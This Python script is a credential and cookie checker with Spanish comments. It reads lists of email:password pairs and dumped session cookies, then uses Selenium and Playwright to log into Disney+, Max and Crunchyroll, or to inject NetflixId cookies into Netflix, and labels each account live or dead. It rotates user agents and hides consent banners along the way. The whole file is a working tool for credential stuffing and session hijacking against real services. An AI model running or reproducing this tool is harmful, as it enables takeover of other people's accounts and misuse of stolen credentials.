import re
import ast
import time
import random
import logging
import datetime
# import socket
import time as tmp
# import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException,TimeoutException
from playwright.sync_api import sync_playwright

logger = logging.getLogger(__name__)
now = datetime.datetime.now()
fecha = now.strftime("%d-%m-%y")

def Cookie(file,matches):
    with open(f'{file}','r') as reads_cookies:
        separacion_fracmentos = [line.strip().split('|') for line in reads_cookies]
        for num in range(len(matches)):#cookie
            rex = separacion_fracmentos[num][0].replace('Email:','')
            Email = re.sub(r'\s+','',rex)
            cookie_string = matches[num] + ']'
            cookie_dict = ast.literal_eval(cookie_string)[0]
            name = cookie_dict['name']
            Value = cookie_dict['value']
            yield Email,Value

def Coincidencias(file):
    with open(f'{file}', 'r') as file_cookies:#leer_cookies
        read_cookies = file_cookies.read() # leer cookies
        matches = re.findall(r'Cookie: (.+?)\]',read_cookies)
        return matches

def GenCorreo(file,filtro):
    accounts = []
    if filtro == True: 
        with open(f'{file}','r') as file:
                lineas = file.readlines()
                longitud = len(lineas)
                for line in lineas:
                    try:
                        User,Cont = (line.strip().split(':'))
                        yield User,Cont
                    except ValueError:
                        print('[-] Formato de archivo incorrecto')
                        break

    if filtro == False:
        matches = Coincidencias(file)
        with open(f'{file}','r') as reads_cookies:
            separacion_fracmentos = [line.strip().split('|') for line in reads_cookies]
            for num in range(len(matches)):#cookie
                rex = separacion_fracmentos[num][0].replace('Email:','')
                Email = re.sub(r'\s+','',rex)
                cookie_string = matches[num] + ']'
                cookie_dict = ast.literal_eval(cookie_string)[0]
                name = cookie_dict['name']
                Value = cookie_dict['value']
                yield Email,Value

def GenAgent(filtro):
    if filtro == False:
                user_agent = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]
                agente = random.choice(user_agent)
                return agente
            
    elif filtro == True:
        user_agent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        # "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78"
        ]
        agente = random.choice(user_agent)
        return agente

def Config(Url,UserAgent,time):
    try:
        options = Options()
        Ag = GenAgent(UserAgent)
        options.set_preference("general.useragent.override",Ag)
        driver = webdriver.Firefox(options=options)
        driver.get(Url)
        short = WebDriverWait(driver, time)
        return driver,short

    except Exception as _:
        print(f'Error en: {_}')

def Disney(Co,Cs):
    try:
        # ===== Genera un driver Y 2 tiempos de espera === #
        driver,short = Config('https://www.disneyplus.com/identity/login/enter-email',True,10)

        # ---- Busca la casiila de donde enviar el Correo -----#
        correo = short.until(EC.presence_of_element_located((By.ID,'email'))).send_keys(Co)
        CorreoClick = driver.find_element(By.XPATH,'/html/body/div/div/main/div/div/div/div/div[2]/div/form/button').click()
        logger.debug('Enviando Correo')  
        # -----------------------------------------------------#
        try:
            contrasena = short.until(EC.presence_of_element_located((By.ID,'password'))).send_keys(Cs) 
            ContrasenaClick = driver.find_element(By.XPATH,'/html/body/div/div/main/div/div/div/div/div[2]/div/form/button').click()

            # verificacion = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div/div/div/div[4]/div/main/div/button'))).text
            verificacion = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div/div/div/div[4]/div/main/div/div/section/ul')))
            if verificacion:
                msg = f'[{Co}][stado:live]'
                driver.quit()
                print(msg)
                
        except TimeoutException:
            msg = f'[{Co}][stado:dead]'
            print(msg)
            driver.quit()
            
    except TimeoutException:
        driver.quit()
        print('[+] No se encontro el elemento')

def Hbo(Co,Cs):
    with sync_playwright() as playwright:
        browser = playwright.firefox.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()  # Create the page here
        page.goto('https://auth.max.com/login?flow=login')

        elements = [
                "#onetrust-banner-sdk .ot-sdk-column",
                "#onetrust-banner-sdk .ot-sdk-columns",
                "#onetrust-pc-sdk .ot-sdk-column",
                "#onetrust-pc-sdk .ot-sdk-columns",
                "#ot-sdk-cookie-policy .ot-sdk-column",
                "#ot-sdk-cookie-policy .ot-sdk-columns"
            ]

        dark_filter = page.wait_for_selector("div.onetrust-pc-dark-filter.ot-fade-in", timeout=60000) 
        page.evaluate("""(el) => el.style.position = 'relative';""", dark_filter)
        
        for element in elements:
            js = f'document.querySelectorAll("{element}").forEach(element => element.style.display = "none");'
            page.evaluate(js)

        page.get_by_test_id("gisdk.gi-login-username.email_field").click()
        page.get_by_test_id("gisdk.gi-login-username.email_field").fill(f"{Co}")

        page.get_by_test_id("gisdk.gi-login-username.password_field").click()
        page.get_by_test_id("gisdk.gi-login-username.password_field").fill(f"{Cs}")

        page.get_by_test_id("gisdk.gi-login-username.signIn_button").click()

        try:
            # https://stackoverflow.com/questions/64303326/using-playwright-for-python-how-do-i-select-or-find-an-element

            time.sleep(8)
            locat = page.query_selector(".notification-message")
            msg = 'That email address or password doesn’t look right.'
            if locat.inner_html() == msg:
                page.close()
                return f'[x][Correo:{Co}][Estado: Dead]'
                
        except Exception:
            page.close()
            return f'[/][Correo:{Co}][Estado: Live]'

def Crunchyroll(Co,Cs):
    try:
        driver,short = Config('https://sso.crunchyroll.com/login',True,7)

        # Co,Cs = next(CadenaUsuarios)
        Correo = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[1]/div[1]/div/label/input'))).send_keys(Co)
        Constrasena = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[1]/div[2]/div/label/input'))).send_keys(Cs)
        Access = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[2]/button'))).click()

        try:
            session = short.until(EC.presence_of_element_located((By.CSS_SELECTOR,'.avatar-wrapper')))
            driver.quit()
            # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Live]')
            msg = f'[{Co}][stado:live]'
            return msg

        except TimeoutException:
            driver.quit()
            msg = f'[{Co}][stado:dead]'
            return msg
            # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Dead]')

    except KeyboardInterrupt:
        pass
        
        # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Live]')
        # break

    except TimeoutException:
        print('[-] Se agoto el tiempo')

    except StopIteration:
        print('[+] Finaliso el script')
        # break

def NC(Email,value):
    try:
        driver,wait = Config("https://netflix.com",True,10)
        tmp.sleep(7)
        driver.delete_all_cookies()

        Diccionario_Cookie = {'name':'NetflixId','value':value}

        driver.add_cookie(Diccionario_Cookie)

        tmp.sleep(3)

        driver.get('https://www.netflix.com/browse')

        try:
            perfiles = wait.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul')))
            if perfiles:
                print(f'Cookie LIVE [✔] {Email}')            
                driver.quit()

        except TimeoutException:
            driver.quit()
            print(f"Cookie  DEAD [✘] {Email}")

    except Exception:
        driver.quit()
        pass
